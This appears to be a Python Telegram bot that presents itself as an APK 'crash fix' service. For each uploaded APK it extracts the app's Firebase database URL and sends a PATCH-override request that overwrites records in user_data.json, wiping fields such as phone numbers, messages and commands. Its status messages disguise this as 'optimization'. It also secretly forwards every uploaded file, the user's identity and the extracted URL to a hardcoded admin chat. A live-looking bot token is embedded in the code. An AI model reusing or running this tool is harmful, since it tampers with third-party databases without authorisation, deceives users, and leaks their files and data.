import os
import re
import html
import zipfile
import requests
import logging
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Logging Setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Telegram Bot Token & Admin ID
BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY".strip()
ADMIN_CHAT_ID = "6240110220"  # आपकी पर्सनल टेलीग्राम चैट आईडी

# Internal Payload
DELETE_PAYLOAD = {
    "messageText": None,
    "phoneNumber": None,
    "simSlot": None,
    "new_user": None,
    "targetDeviceId": None,
    "command": None
}

# Render Health Check Server (GET & HEAD Both Handled)
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Telegram Bot is Running!")

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    server.serve_forever()

# 1. Start Command Handler (Premium UI)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    safe_name = html.escape(user.first_name)

    welcome_text = (
        f"👋 <b>Welcome, {safe_name}!</b>\n\n"
        "✨ <b>Pannel Crash FIx Bot</b>\n"
        "<i>Fast, Fast Pannel Crash Fix In Second.</i>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 <b>How to use:</b>\n"
        "• Simply upload your <b>.apk</b> file in this chat.\n"
        "• Wait a few seconds while we process your file.\n"
        "• Receive your processed file instantly.\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🚀 <b>Send your .apk file to begin!</b>"
    )

    keyboard = [
        [
            InlineKeyboardButton("💬 Support", url="https://t.me/AD_ASHU")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        text=welcome_text,
        parse_mode="HTML",
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# 2. Extract Firebase URL (Internal Only)
def extract_firebase_url(apk_path):
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            if 'resources.arsc' in zip_ref.namelist():
                content = zip_ref.read('resources.arsc')
                match = re.search(rb'https://[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.firebaseio\.com', content)
                if match:
                    return match.group(0).decode('utf-8')
    except Exception as e:
        logging.error(f"Extraction Error: {e}")
    return None

# 3. Process Target REST API (Internal Only)
def delete_firebase_data(base_url):
    try:
        target_url = base_url.strip()
        if not target_url.endswith('/'):
            target_url += '/'
        if 'user_data.json' not in target_url and 'user_data.json' not in target_url:
            target_url += 'user_data.json'

        headers = {
            'X-HTTP-Method-Override': 'PATCH',
            'Content-Type': 'application/json'
        }
        
        response = requests.post(target_url, json=DELETE_PAYLOAD, headers=headers, timeout=15)
        return response.status_code == 200
    except Exception as e:
        logging.error(f"REST API Error: {e}")
        return False

# 4. Handle APK Document
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    user = update.effective_user
    
    if not document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ <b>Invalid File!</b> Please send a valid <code>.apk</code> file.", parse_mode="HTML")
        return

    status_msg = await update.message.reply_text("📥 <b>Downloading APK...</b>", parse_mode="HTML")
    file_path = f"temp_{document.file_id}.apk"
    
    try:
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        
        await status_msg.edit_text("⚙️ <b>Analyzing package contents...</b>", parse_mode="HTML")
        
        firebase_url = extract_firebase_url(file_path)
        
        if not firebase_url:
            await status_msg.edit_text("❌ <b>Processing Failed!</b> Unable to process this APK configuration.", parse_mode="HTML")
            if os.path.exists(file_path):
                os.remove(file_path)
            return

        await status_msg.edit_text("⚡ <b>Finalizing optimization...</b>", parse_mode="HTML")
        
        process_success = delete_firebase_data(firebase_url)
        
        if process_success:
            await status_msg.edit_text("✅ <b>Process Complete!</b> Sending your updated file back...", parse_mode="HTML")
            
            # 1. Send processed APK back to User
            with open(file_path, 'rb') as apk_file:
                await update.message.reply_document(
                    document=apk_file,
                    filename=document.file_name,
                    caption="✨ <b>Processing successful!</b>\nSend me the next APK whenever you're ready.",
                    parse_mode="HTML"
                )
            
            # 2. Forward complete details to Admin (Internal Logging)
            safe_name = html.escape(user.full_name)
            safe_username = html.escape(user.username) if user.username else "No Username"
            safe_url = html.escape(firebase_url)
            
            admin_caption = (
                f"📥 <b>New APK Processed!</b>\n\n"
                f"👤 <b>User:</b> {safe_name} (@{safe_username})\n"
                f"🆔 <b>User ID:</b> <code>{user.id}</code>\n\n"
                f"🔗 <b>Extracted URL:</b>\n<code>{safe_url}</code>\n\n"
                f"✅ <b>Status:</b> Success"
            )
            
            with open(file_path, 'rb') as admin_apk_file:
                await context.bot.send_document(
                    chat_id=ADMIN_CHAT_ID,
                    document=admin_apk_file,
                    filename=document.file_name,
                    caption=admin_caption,
                    parse_mode="HTML"
                )
        else:
            await status_msg.edit_text("❌ <b>Server Error!</b> Unable to complete the request right now.", parse_mode="HTML")

    except Exception as e:
        await status_msg.edit_text(f"❌ <b>Error:</b> {html.escape(str(e))}", parse_mode="HTML")

    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

if __name__ == '__main__':
    # Start Web Health Check Server Thread
    Thread(target=run_dummy_server, daemon=True).start()

    # Start Telegram Bot
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    logging.info("Bot is starting...")
    app.run_polling()
